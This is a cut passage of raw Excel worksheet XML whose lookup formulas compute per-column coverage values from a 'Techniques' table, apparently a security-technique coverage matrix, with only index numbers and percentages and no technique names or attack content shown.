    <col min="9" max="9" width="20.6640625" style="4" customWidth="1"/>
    <col min="10" max="10" width="5.109375" style="5" customWidth="1"/>
    <col min="11" max="11" width="20.6640625" style="4" customWidth="1"/>
    <col min="12" max="12" width="5.109375" style="5" customWidth="1"/>
    <col min="13" max="13" width="20.6640625" style="4" customWidth="1"/>
    <col min="14" max="14" width="5.109375" style="5" customWidth="1"/>
    <col min="15" max="15" width="20.6640625" style="4" customWidth="1"/>
    <col min="16" max="16" width="5.109375" style="5" customWidth="1"/>
    <col min="17" max="17" width="20.6640625" style="4" customWidth="1"/>
    <col min="18" max="18" width="5.109375" style="5" customWidth="1"/>
    <col min="19" max="19" width="20.6640625" style="4" customWidth="1"/>
    <col min="20" max="20" width="5.109375" style="5" customWidth="1"/>
    <col min="21" max="21" width="20.6640625" style="4" customWidth="1"/>
    <col min="22" max="22" width="5.109375" style="5" customWidth="1"/>
    <col min="23" max="23" width="20.6640625" style="4" customWidth="1"/>
    <col min="24" max="24" width="5.109375" style="5" customWidth="1"/>
    <col min="25" max="25" width="20.6640625" style="4" customWidth="1"/>
    <col min="26" max="26" width="5.109375" style="5" customWidth="1"/>
    <col min="27" max="27" width="20.6640625" style="4" customWidth="1"/>
    <col min="28" max="28" width="5.109375" style="5" customWidth="1"/>
    <col min="29" max="16384" width="8.88671875" style="6"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:28" s="3" customFormat="1" ht="27" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A1" s="1" t="s">
        <v>0</v>
      </c>
      <c r="B1" s="2" cm="1">
        <f t="array" ref="B1">SUM(IF(B2:B200&lt;&gt;"",B2:B200,0))/SUM(IF(A2:A200&lt;&gt;"",1,0))</f>
        <v>3.3333333333333333E-2</v>
      </c>
      <c r="C1" s="1" t="s">
        <v>1</v>
      </c>
      <c r="D1" s="2" cm="1">
        <f t="array" ref="D1">SUM(IF(D2:D200&lt;&gt;"",D2:D200,0))/SUM(IF(C2:C200&lt;&gt;"",1,0))</f>
        <v>0</v>
      </c>
      <c r="E1" s="1" t="s">
        <v>2</v>
      </c>
      <c r="F1" s="2" cm="1">
        <f t="array" ref="F1">SUM(IF(F2:F200&lt;&gt;"",F2:F200,0))/SUM(IF(E2:E200&lt;&gt;"",1,0))</f>
        <v>0</v>
      </c>
      <c r="G1" s="1" t="s">
        <v>3</v>
      </c>
      <c r="H1" s="2" cm="1">
        <f t="array" ref="H1">SUM(IF(H2:H200&lt;&gt;"",H2:H200,0))/SUM(IF(G2:G200&lt;&gt;"",1,0))</f>
        <v>6.4935064935064939E-3</v>
      </c>
      <c r="I1" s="1" t="s">
        <v>4</v>
      </c>
      <c r="J1" s="2" cm="1">
        <f t="array" ref="J1">SUM(IF(J2:J200&lt;&gt;"",J2:J200,0))/SUM(IF(I2:I200&lt;&gt;"",1,0))</f>
        <v>0</v>
      </c>
      <c r="K1" s="1" t="s">
        <v>5</v>
      </c>
      <c r="L1" s="2" cm="1">
        <f t="array" ref="L1">SUM(IF(L2:L200&lt;&gt;"",L2:L200,0))/SUM(IF(K2:K200&lt;&gt;"",1,0))</f>
        <v>0</v>
      </c>
      <c r="M1" s="1" t="s">
        <v>6</v>
      </c>
      <c r="N1" s="2" cm="1">
        <f t="array" ref="N1">SUM(IF(N2:N200&lt;&gt;"",N2:N200,0))/SUM(IF(M2:M200&lt;&gt;"",1,0))</f>
        <v>2.6623376623376625E-2</v>
      </c>
      <c r="O1" s="1" t="s">
        <v>7</v>
      </c>
      <c r="P1" s="2" cm="1">
        <f t="array" ref="P1">SUM(IF(P2:P200&lt;&gt;"",P2:P200,0))/SUM(IF(O2:O200&lt;&gt;"",1,0))</f>
        <v>1.4705882352941176E-2</v>
      </c>
      <c r="Q1" s="1" t="s">
        <v>8</v>
      </c>
      <c r="R1" s="2" cm="1">
        <f t="array" ref="R1">SUM(IF(R2:R200&lt;&gt;"",R2:R200,0))/SUM(IF(Q2:Q200&lt;&gt;"",1,0))</f>
        <v>4.6875E-2</v>
      </c>
      <c r="S1" s="1" t="s">
        <v>9</v>
      </c>
      <c r="T1" s="2" cm="1">
        <f t="array" ref="T1">SUM(IF(T2:T200&lt;&gt;"",T2:T200,0))/SUM(IF(S2:S200&lt;&gt;"",1,0))</f>
        <v>0</v>
      </c>
      <c r="U1" s="1" t="s">
        <v>10</v>
      </c>
      <c r="V1" s="2" cm="1">
        <f t="array" ref="V1">SUM(IF(V2:V200&lt;&gt;"",V2:V200,0))/SUM(IF(U2:U200&lt;&gt;"",1,0))</f>
        <v>0</v>
      </c>
      <c r="W1" s="1" t="s">
        <v>11</v>
      </c>
      <c r="X1" s="2" cm="1">
        <f t="array" ref="X1">SUM(IF(X2:X200&lt;&gt;"",X2:X200,0))/SUM(IF(W2:W200&lt;&gt;"",1,0))</f>
        <v>0</v>
      </c>
      <c r="Y1" s="1" t="s">
        <v>12</v>
      </c>
      <c r="Z1" s="2" cm="1">
        <f t="array" ref="Z1">SUM(IF(Z2:Z200&lt;&gt;"",Z2:Z200,0))/SUM(IF(Y2:Y200&lt;&gt;"",1,0))</f>
        <v>0.1111111111111111</v>
      </c>
      <c r="AA1" s="1" t="s">
        <v>13</v>
      </c>
      <c r="AB1" s="2" cm="1">
        <f t="array" ref="AB1">SUM(IF(AB2:AB200&lt;&gt;"",AB2:AB200,0))/SUM(IF(AA2:AA200&lt;&gt;"",1,0))</f>
        <v>0</v>
      </c>
    </row>
    <row r="2" spans="1:28" ht="27" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A2" s="4" t="s">
        <v>14</v>
      </c>
      <c r="B2" s="16">
        <f>IF(A2&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(A2,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(A2,Techniques[Name],0)),""),"")</f>
        <v>0.33333333333333331</v>
      </c>
      <c r="C2" s="4" t="s">
        <v>15</v>
      </c>
      <c r="D2" s="16" t="str">
        <f>IF(C2&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(C2,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(C2,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="E2" s="4" t="s">
        <v>16</v>
      </c>
      <c r="F2" s="16" t="str">
        <f>IF(E2&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(E2,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(E2,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="G2" s="4" t="s">
        <v>17</v>
      </c>
      <c r="H2" s="16" t="str">
        <f>IF(G2&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(G2,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(G2,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="I2" s="4" t="s">
        <v>18</v>
      </c>
      <c r="J2" s="16" t="str">
        <f>IF(I2&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(I2,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(I2,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="K2" s="4" t="s">
        <v>19</v>
      </c>
      <c r="L2" s="16" t="str">
        <f>IF(K2&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(K2,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(K2,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="M2" s="4" t="s">
        <v>19</v>
      </c>
      <c r="N2" s="16" t="str">
        <f>IF(M2&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(M2,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(M2,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="O2" s="4" t="s">
        <v>20</v>
      </c>
      <c r="P2" s="16" t="str">
        <f>IF(O2&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(O2,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(O2,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="Q2" s="4" t="s">
        <v>21</v>
      </c>
      <c r="R2" s="16" t="str">
        <f>IF(Q2&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(Q2,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(Q2,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="S2" s="4" t="s">
        <v>22</v>
      </c>
      <c r="T2" s="16" t="str">
        <f>IF(S2&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(S2,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(S2,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="U2" s="4" t="s">
        <v>20</v>
      </c>
      <c r="V2" s="16" t="str">
        <f>IF(U2&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(U2,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(U2,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="W2" s="4" t="s">
        <v>23</v>
      </c>
      <c r="X2" s="16" t="str">
        <f>IF(W2&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(W2,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(W2,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="Y2" s="4" t="s">
        <v>24</v>
      </c>
      <c r="Z2" s="16">
        <f>IF(Y2&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(Y2,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(Y2,Techniques[Name],0)),""),"")</f>
        <v>1</v>
      </c>
      <c r="AA2" s="4" t="s">
        <v>25</v>
      </c>
      <c r="AB2" s="16" t="str">
        <f>IF(AA2&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(AA2,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(AA2,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
    </row>
    <row r="3" spans="1:28" ht="27" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A3" s="4" t="s">
        <v>26</v>
      </c>
      <c r="B3" s="16" t="str">
        <f>IF(A3&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(A3,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(A3,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="C3" s="4" t="s">
        <v>27</v>
      </c>
      <c r="D3" s="16" t="str">
        <f>IF(C3&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(C3,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(C3,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="E3" s="4" t="s">
        <v>28</v>
      </c>
      <c r="F3" s="16" t="str">
        <f>IF(E3&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(E3,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(E3,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="G3" s="4" t="s">
        <v>29</v>
      </c>
      <c r="H3" s="16">
        <f>IF(G3&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(G3,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(G3,Techniques[Name],0)),""),"")</f>
        <v>9.0909090909090912E-2</v>
      </c>
      <c r="I3" s="4" t="s">
        <v>30</v>
      </c>
      <c r="J3" s="16" t="str">
        <f>IF(I3&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(I3,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(I3,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="K3" s="4" t="s">
        <v>31</v>
      </c>
      <c r="L3" s="16" t="str">
        <f>IF(K3&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(K3,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(K3,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="M3" s="4" t="s">
        <v>31</v>
      </c>
      <c r="N3" s="16" t="str">
        <f>IF(M3&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(M3,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(M3,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="O3" s="4" t="s">
        <v>32</v>
      </c>
      <c r="P3" s="16" t="str">
        <f>IF(O3&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(O3,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(O3,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="Q3" s="4" t="s">
        <v>33</v>
      </c>
      <c r="R3" s="16">
        <f>IF(Q3&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(Q3,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(Q3,Techniques[Name],0)),""),"")</f>
        <v>1</v>
      </c>
      <c r="S3" s="4" t="s">
        <v>34</v>
      </c>
      <c r="T3" s="16" t="str">
        <f>IF(S3&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(S3,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(S3,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="U3" s="4" t="s">
        <v>35</v>
      </c>
      <c r="V3" s="16" t="str">
        <f>IF(U3&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(U3,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(U3,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="W3" s="4" t="s">
        <v>36</v>
      </c>
      <c r="X3" s="16" t="str">
        <f>IF(W3&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(W3,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(W3,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="Y3" s="4" t="s">
        <v>37</v>
      </c>
      <c r="Z3" s="16" t="str">
        <f>IF(Y3&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(Y3,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(Y3,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="AA3" s="4" t="s">
        <v>38</v>
      </c>
      <c r="AB3" s="16" t="str">
        <f>IF(AA3&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(AA3,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(AA3,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
    </row>
    <row r="4" spans="1:28" ht="27" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A4" s="4" t="s">
        <v>39</v>
      </c>
      <c r="B4" s="16" t="str">
        <f>IF(A4&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(A4,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(A4,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="C4" s="4" t="s">
        <v>40</v>
      </c>
      <c r="D4" s="16" t="str">
        <f>IF(C4&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(C4,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(C4,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="E4" s="4" t="s">
        <v>41</v>
      </c>
      <c r="F4" s="16" t="str">
        <f>IF(E4&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(E4,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(E4,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="G4" s="4" t="s">
        <v>42</v>
      </c>
      <c r="H4" s="16" t="str">
        <f>IF(G4&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(G4,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(G4,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="I4" s="4" t="s">
        <v>43</v>
      </c>
      <c r="J4" s="16" t="str">
        <f>IF(I4&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(I4,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(I4,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="K4" s="4" t="s">
        <v>18</v>
      </c>
      <c r="L4" s="16" t="str">
        <f>IF(K4&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(K4,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(K4,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="M4" s="4" t="s">
        <v>30</v>
      </c>
      <c r="N4" s="16" t="str">
        <f>IF(M4&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(M4,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(M4,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="O4" s="4" t="s">
        <v>44</v>
      </c>
      <c r="P4" s="16" t="str">
        <f>IF(O4&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(O4,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(O4,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="Q4" s="4" t="s">
        <v>45</v>
      </c>
      <c r="R4" s="16" t="str">
        <f>IF(Q4&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(Q4,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(Q4,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="S4" s="4" t="s">
        <v>46</v>
      </c>
      <c r="T4" s="16" t="str">
        <f>IF(S4&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(S4,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(S4,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="U4" s="4" t="s">
        <v>47</v>
      </c>
      <c r="V4" s="16" t="str">
        <f>IF(U4&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(U4,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(U4,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="W4" s="4" t="s">
        <v>16</v>
      </c>
      <c r="X4" s="16" t="str">
        <f>IF(W4&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(W4,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(W4,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="Y4" s="4" t="s">
        <v>48</v>
      </c>
      <c r="Z4" s="16" t="str">
        <f>IF(Y4&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(Y4,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(Y4,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="AA4" s="4" t="s">
        <v>49</v>
      </c>
      <c r="AB4" s="16" t="str">
        <f>IF(AA4&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(AA4,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(AA4,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
    </row>
    <row r="5" spans="1:28" ht="27" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A5" s="4" t="s">
        <v>50</v>
      </c>
      <c r="B5" s="16" t="str">
        <f>IF(A5&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(A5,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(A5,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="C5" s="4" t="s">
        <v>51</v>
      </c>
      <c r="D5" s="16" t="str">
        <f>IF(C5&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(C5,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(C5,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="E5" s="4" t="s">
        <v>52</v>
      </c>
      <c r="F5" s="16" t="str">
        <f>IF(E5&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(E5,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(E5,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="G5" s="4" t="s">
        <v>53</v>
      </c>
      <c r="H5" s="16" t="str">
        <f>IF(G5&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(G5,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(G5,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="I5" s="4" t="s">
        <v>54</v>
      </c>
      <c r="J5" s="16" t="str">
        <f>IF(I5&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(I5,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(I5,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="K5" s="4" t="s">
        <v>43</v>
      </c>
      <c r="L5" s="16" t="str">
        <f>IF(K5&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(K5,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(K5,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="M5" s="4" t="s">
        <v>55</v>
      </c>
      <c r="N5" s="16" t="str">
        <f>IF(M5&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(M5,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(M5,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="O5" s="4" t="s">
        <v>56</v>
      </c>
      <c r="P5" s="16" t="str">
        <f>IF(O5&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(O5,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(O5,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="Q5" s="4" t="s">
        <v>57</v>
      </c>
      <c r="R5" s="16" t="str">
        <f>IF(Q5&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(Q5,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(Q5,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="S5" s="4" t="s">
        <v>58</v>
      </c>
      <c r="T5" s="16" t="str">
        <f>IF(S5&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(S5,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(S5,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="U5" s="4" t="s">
        <v>59</v>
      </c>
      <c r="V5" s="16" t="str">
        <f>IF(U5&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(U5,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(U5,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="W5" s="4" t="s">
        <v>60</v>
      </c>
      <c r="X5" s="16" t="str">
        <f>IF(W5&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(W5,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(W5,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="Y5" s="4" t="s">
        <v>61</v>
      </c>
      <c r="Z5" s="16" t="str">
        <f>IF(Y5&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(Y5,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(Y5,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="AA5" s="4" t="s">
        <v>62</v>
      </c>
      <c r="AB5" s="16" t="str">
        <f>IF(AA5&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(AA5,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(AA5,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
    </row>
    <row r="6" spans="1:28" ht="27" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A6" s="4" t="s">
        <v>63</v>
      </c>
      <c r="B6" s="16" t="str">
        <f>IF(A6&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(A6,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(A6,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="C6" s="4" t="s">
        <v>64</v>
      </c>
      <c r="D6" s="16" t="str">
        <f>IF(C6&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(C6,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(C6,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="E6" s="4" t="s">
        <v>65</v>
      </c>
      <c r="F6" s="16" t="str">
        <f>IF(E6&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(E6,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(E6,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="G6" s="4" t="s">
        <v>66</v>
      </c>
      <c r="H6" s="16" t="str">
        <f>IF(G6&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(G6,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(G6,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="I6" s="4" t="s">
        <v>67</v>
      </c>
      <c r="J6" s="16" t="str">
        <f>IF(I6&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(I6,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(I6,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="K6" s="4" t="s">
        <v>54</v>
      </c>
      <c r="L6" s="16" t="str">
        <f>IF(K6&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(K6,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(K6,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="M6" s="4" t="s">
        <v>68</v>
      </c>
      <c r="N6" s="16" t="str">
        <f>IF(M6&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(M6,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(M6,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="O6" s="4" t="s">
        <v>69</v>
      </c>
      <c r="P6" s="16" t="str">
        <f>IF(O6&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(O6,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(O6,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="Q6" s="4" t="s">
        <v>70</v>
      </c>
      <c r="R6" s="16" t="str">
        <f>IF(Q6&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(Q6,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(Q6,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="S6" s="4" t="s">
        <v>71</v>
      </c>
      <c r="T6" s="16" t="str">
        <f>IF(S6&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(S6,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(S6,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="U6" s="4" t="s">
        <v>72</v>
      </c>
      <c r="V6" s="16" t="str">
        <f>IF(U6&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(U6,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(U6,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="W6" s="4" t="s">
        <v>73</v>
      </c>
      <c r="X6" s="16" t="str">
        <f>IF(W6&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(W6,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(W6,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="Y6" s="4" t="s">
        <v>74</v>
      </c>
      <c r="Z6" s="16" t="str">
        <f>IF(Y6&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(Y6,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(Y6,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="AA6" s="4" t="s">
        <v>75</v>
      </c>
      <c r="AB6" s="16" t="str">
        <f>IF(AA6&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(AA6,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(AA6,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
    </row>
    <row r="7" spans="1:28" ht="27" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A7" s="4" t="s">
        <v>76</v>
      </c>
      <c r="B7" s="16" t="str">
        <f>IF(A7&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(A7,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(A7,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="C7" s="4" t="s">
        <v>77</v>
      </c>
      <c r="D7" s="16" t="str">
        <f>IF(C7&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(C7,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(C7,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="E7" s="4" t="s">
        <v>78</v>
      </c>
      <c r="F7" s="16" t="str">
        <f>IF(E7&lt;&gt;"",IF(INDEX(Techniques[Coverage],MATCH(E7,Techniques[Name],0))&gt;0,INDEX(Techniques[Coverage],MATCH(E7,Techniques[Name],0)),""),"")</f>
        <v/>
      </c>
      <c r="G7" s="4" t="s">
        <v>79</v>
      </c>
      <c r="H7" s="16" t="str">
